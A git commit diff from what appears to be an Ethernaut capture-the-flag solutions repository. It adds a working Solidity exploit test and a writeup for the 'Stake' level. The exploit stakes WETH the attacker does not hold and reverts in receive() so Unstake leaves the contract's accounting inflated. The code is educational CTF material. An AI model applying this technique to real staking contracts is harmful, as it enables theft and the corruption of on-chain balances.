730c2431ce98e9249c5079f6b7f462b5bc98aab6
bentobox19.eth <bentobox19@protonmail.com>
2025-01-30 10:19:30 -0300

    Solved 31

--- test/31-stake/Stake.t.sol
+++ test/31-stake/Stake.t.sol
@@ -5,11 +5,7 @@ import "forge-std/Test.sol";
 import "../Utils.sol";
 
 interface IStaker {
-  function totalStaked() external returns (uint256);
-  function UserStake(address) external returns (uint256);
-  function Stakers(address) external returns (bool);
   function WETH() external returns (address);
-
   function StakeETH() external payable;
   function StakeWETH(uint256 amount) external returns (bool);
   function Unstake(uint256 amount) external returns (bool);
@@ -20,7 +16,6 @@ interface IWETH {
 }
 
 contract StakeTest is Test {
-  address private constant playerAddress = address(uint160(uint256(keccak256(abi.encodePacked("PLAYER")))));
   address private challengeAddress;
 
   function setUp() public {
@@ -28,43 +23,45 @@ contract StakeTest is Test {
   }
 
   function testExploit() public {
-    // Part of the game.
-    // See:
-    // https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/test/levels/Stake.t.sol
-    // We need less, though
-    vm.deal(playerAddress, 0.001 ether + 1 wei);
-    vm.startPrank(playerAddress);
-
-    address wethAddress = IStaker(challengeAddress).WETH();
-    IWETH(wethAddress).approve(challengeAddress, type(uint256).max);
-
-    // Make stakeAddress.balance != 0
+    // Makes
+    //   stakeAddress.balance != 0
     IStaker(challengeAddress).StakeETH{value: 0.001 ether + 1 wei}();
 
-    // Stake unexisting funds
-    // (We do not have 0.001 ether + 1 wei in WETH)
-    IStaker(challengeAddress).StakeWETH(0.001 ether + 1 wei);
-
-    // Trigger Unstake to flush our UserStake, but without receiving the funds
+    // Makes
+    //  stake.UserStake(_player) == 0
+    // but since this contract's `receive()` reverts, keeps
+    //  stakeAddress.balance != 0
     IStaker(challengeAddress).Unstake(0.001 ether + 1 wei);
-    /// IStaker(challengeAddress).Unstake(0.001 ether + 1 wei);
 
-    // Check the winning conditions
-    // - The `Stake` contract's ETH balance has to be greater than 0.
-    assertNotEq(challengeAddress.balance, 0);
-    // - totalStaked must be greater than the Stake contract's ETH balance.
-    assertGt(IStaker(challengeAddress).totalStaked(), challengeAddress.balance);
-    // - You must be a staker.
-    assertTrue(IStaker(challengeAddress).Stakers(playerAddress));
-    // - Your staked balance must be 0.
-    // assertEq(IStaker(challengeAddress).UserStake(playerAddress), 0);
+    // We need the help of this contract to inflate
+    // the Staker's stake balance
+    AttackAssistant attackAssistant = new AttackAssistant(challengeAddress);
+    attackAssistant.attack();
 
-    vm.stopPrank();
-
-    // utils.submitLevelInstance(challengeAddress);
+    utils.submitLevelInstance(challengeAddress);
   }
 
-  fallback() external payable {
-    revert("not receiving these funds");
+  receive() external payable {
+    // This one helps with the condition
+    //   "Your staked balance must be 0.""
+    revert("Not receiving funds here.");
+  }
+}
+
+contract AttackAssistant {
+  address private challengeAddress;
+
+  constructor(address _challengeAddress) payable {
+    challengeAddress = _challengeAddress;
+  }
+
+  function attack() external {
+    // Stakes unexisting funds
+    // (We do not have 0.001 ether + 2 wei in WETH)
+    // Makes
+    //    stake.totalStaked() > stakeAddress.balance
+    address wethAddress = IStaker(challengeAddress).WETH();
+    IWETH(wethAddress).approve(challengeAddress, type(uint256).max);
+    IStaker(challengeAddress).StakeWETH(0.001 ether + 2 wei);
   }
 }
--- writeups.md
+++ writeups.md
@@ -2211,12 +2211,68 @@ In words:
 
 ### Solution
 
-???
+Three points:
 
-### Implementation
+* `StakeWETH()` will write `totalStaked`, `UserStake`, and `Stakers` even if the WETH transaction fails.
+* `Unstake()` will write `UserStake` and `totalStaked` even if the ETH transfer fails.
+* You want to assist yourself with a contract to inflate the Staker's stake balance.
 
-???
+See in code documentation for the implementation.
+
+```
+contract StakeTest is Test {
+  address private challengeAddress;
+
+  function setUp() public {
+    challengeAddress = utils.createLevelInstance(0x32FFB8d4244B350F5D3E074e9b731A135531B975);
+  }
+
+  function testExploit() public {
+    // Makes
+    //   stakeAddress.balance != 0
+    IStaker(challengeAddress).StakeETH{value: 0.001 ether + 1 wei}();
+
+    // Makes
+    //  stake.UserStake(_player) == 0
+    // but since this contract's `receive()` reverts, keeps
+    //  stakeAddress.balance != 0
+    IStaker(challengeAddress).Unstake(0.001 ether + 1 wei);
+
+    // We need the help of this contract to inflate
+    // the Staker's stake balance
+    AttackAssistant attackAssistant = new AttackAssistant(challengeAddress);
+    attackAssistant.attack();
+
+    utils.submitLevelInstance(challengeAddress);
+  }
+
+  receive() external payable {
+    // This one helps with the condition
+    //   "Your staked balance must be 0.""
+    revert("Not receiving funds here.");
+  }
+}
+
+contract AttackAssistant {
+  address private challengeAddress;
+
+  constructor(address _challengeAddress) payable {
+    challengeAddress = _challengeAddress;
+  }
+
+  function attack() external {
+    // Stakes unexisting funds
+    // (We do not have 0.001 ether + 2 wei in WETH)
+    // Makes
+    //    stake.totalStaked() > stakeAddress.balance
+    address wethAddress = IStaker(challengeAddress).WETH();
+    IWETH(wethAddress).approve(challengeAddress, type(uint256).max);
+    IStaker(challengeAddress).StakeWETH(0.001 ether + 2 wei);
+  }
+}
+```
 
 ### References
 
-???
+* https://docs.openzeppelin.com/contracts/4.x/erc20
+* https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
